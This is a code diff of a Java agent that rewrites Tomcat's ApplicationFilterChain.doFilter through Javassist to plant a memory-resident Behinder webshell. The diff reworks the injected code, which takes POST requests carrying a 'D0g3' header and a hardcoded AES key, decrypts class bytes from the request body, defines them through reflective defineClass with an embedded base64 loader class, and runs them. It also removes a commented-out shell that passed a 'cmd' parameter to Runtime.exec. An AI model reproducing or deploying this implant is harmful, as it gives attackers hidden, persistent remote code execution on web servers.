@@ -30,6 +30,7 @@ public class TomcatAgentFilter {
     public static class DefineTransformer implements ClassFileTransformer {
 
         public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
+        //public static final String ClassName = "org.apache.tomcat.websocket.server.WsFilter";
 
         public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
             className = className.replace("/",".");
@@ -39,80 +40,79 @@ public class TomcatAgentFilter {
                 try {
                     CtClass c = pool.getCtClass(className);
                     CtMethod m = c.getDeclaredMethod("doFilter");
-
-                    m.insertBefore("        java.lang.String behinderShellHeader = \"D0g3\";\n" +
-                            "        java.lang.String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
-                            "        javax.servlet.http.HttpServletRequest req =  request;\n" +
-                            "        javax.servlet.http.HttpServletResponse res = response;\n" +
-                            "        if(req.getHeader(behinderShellHeader) != null&&req.getMethod().equals(\"POST\")) {\n" +
-                            "            //behind4 shell\n" +
+                    m.insertBefore("        String behinderShellHeader = \"D0g3\";\n" +
+                            "        String behinderShellPwd = \"b9ecd0aebe82a741\"; // Crilwa\n" +
+                            "        if(((javax.servlet.http.HttpServletRequest)request).getHeader(behinderShellHeader) != null&&(((javax.servlet.http.HttpServletRequest)request).getMethod().equals(\"POST\"))) {\n" +
                             "            try {\n" +
-                            "                java.lang.String k = behinderShellPwd;\n" +
-                            "                javax.servlet.http.HttpSession session = req.getSession();\n" +
+                            "                String k = behinderShellPwd;\n" +
+                            "                javax.servlet.http.HttpSession session = ((javax.servlet.http.HttpServletRequest)request).getSession();\n" +
                             "                session.putValue(\"u\", k);\n" +
-                            "                javax.crypto.CipherCipher c = Cipher.getInstance(\"AES\");\n" +
+                            "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                             "                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
-                            "\n" +
-                            "                java.util.HashMap map = new HashMap();\n" +
-                            "                map.put(\"request\", req);\n" +
-                            "                map.put(\"response\", res);\n" +
+                            "                System.out.println(\"print c.init\");\n" +
+                            "                java.util.HashMap map = new java.util.HashMap();\n" +
+                            "                map.put(\"request\", request);\n" +
+                            "                map.put(\"response\", response);\n" +
                             "                map.put(\"session\", session);\n" +
-                            "\n" +
+                            "                System.out.println(\"map put\");\n" +
                             "                //取classloader\n" +
                             "                byte[] bytecode = java.util.Base64.getDecoder().decode(\"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT\");\n" +
-                            "                java.lang.ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
-                            "                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
+                            "                ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();\n" +
+                            "                System.out.println(\"cl 1 : \" + cl.toString());\n" +
+                            "                cl = org.apache.catalina.core.ApplicationFilterChain.class.getClassLoader();\n" +
+                            "                System.out.println(\"cl 2 : \" + cl.toString());\n" +
+                            "                Class Lclass = null;\n" +
+                            "                if (((javax.servlet.http.HttpServletRequest) request).getHeader(behinderShellHeader) != null && (((javax.servlet.http.HttpServletRequest) request).getMethod().equals(\"POST\"))) {\n" +
+                            "                    if (cl.getClass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass();\n" +
+                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass();\n" +
+                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();\n" +
+                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
+                            "                    } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
+                            "                    } else {\n" +
+                            "                        Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();\n" +
+                            "                    }\n" +
+                            "                }\n" +
+                            "                java.lang.reflect.Method define = Lclass.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
                             "                define.setAccessible(true);\n" +
-                            "                java.lang.Class uclass = null;\n" +
+                            "                Class uclass = null;\n" +
                             "                try {\n" +
                             "                    uclass = cl.loadClass(\"U\");\n" +
                             "                } catch (ClassNotFoundException e) {\n" +
-                            "                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);\n" +
+                            "                    try {\n" +
+                            "                        uclass = (Class) define.invoke(cl, new Object[]{bytecode, 0, bytecode.length});\n" +
+                            "                    }catch (Exception b){\n" +
+                            "                        b.printStackTrace();\n" +
+                            "                    }\n" +
                             "                }\n" +
-                            "\n" +
-                            "                java.lang.reflect.ConstructorConstructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);\n" +
+                            "                System.out.println(\"get ClassLoader\");\n" +
+                            "                java.lang.reflect.Constructor constructor = uclass.getDeclaredConstructor(new Class[]{ClassLoader.class});\n" +
+                            "                System.out.println(\"1\");\n" +
                             "                constructor.setAccessible(true);\n" +
-                            "                Object u = constructor.newInstance(this.getClass().getClassLoader());\n" +
-                            "                java.lang.reflect.MethodMethod Um = uclass.getDeclaredMethod(\"g\", byte[].class);\n" +
+                            "                Object u = constructor.newInstance(new Object[]{this.getClass().getClassLoader()});\n" +
+                            "                System.out.println(\"2\");\n" +
+                            "                java.lang.reflect.Method Um = uclass.getDeclaredMethod(\"g\", new Class[]{byte[].class});\n" +
+                            "                System.out.println(\"3\");\n" +
                             "                Um.setAccessible(true);\n" +
                             "\n" +
                             "                //冰蝎payload\n" +
-                            "                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));\n" +
-                            "                java.lang.Class evilclass = (Class) Um.invoke(u, evilClassBytes);\n" +
+                            "                System.out.println(\"冰蝎payload\");\n" +
+                            "                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
+                            "                Class evilclass = (Class) Um.invoke(u,new Object[]{evilClassBytes});\n" +
                             "                Object a = evilclass.newInstance();\n" +
-                            "                java.lang.reflect.Method b = evilclass.getDeclaredMethod(\"equals\", Object.class);\n" +
+                            "                java.lang.reflect.Method b = evilclass.getDeclaredMethod(\"equals\",new Class[]{Object.class});\n" +
                             "                b.setAccessible(true);\n" +
-                            "                b.invoke(a, map);\n" +
+                            "                b.invoke(a, new Object[]{map});\n" +
                             "            } catch (Exception e) {\n" +
-                            "                // pass\n" +
+                            "                e.printStackTrace();\n" +
                             "            }\n" +
                             "        }");
 
-
-                    /*
-                    m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
-                            "javax.servlet.http.HttpServletResponse res = response;\n" +
-                            "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
-                            "if (cmd != null){\n" +
-                            "    try {\n" +
-                            "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
-                            "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
-                            "        String line;\n" +
-                            "        StringBuilder sb = new StringBuilder(\"\");\n" +
-                            "        while ((line=reader.readLine()) != null){\n" +
-                            "            sb.append(line).append(\"\\n\");\n" +
-                            "        }\n" +
-                            "        response.getOutputStream().print(sb.toString());\n" +
-                            "        response.getOutputStream().flush();\n" +
-                            "        response.getOutputStream().close();\n" +
-                            "    } catch (Exception e){\n" +
-                            "        e.printStackTrace();\n" +
-                            "    }\n" +
-                            "}");
-
-
-                     */
-
+                    System.out.println("inject success");
                     byte[] bytes = c.toBytecode();
                     // 将 c 从 classpool 中删除以释放内存
                     c.detach();
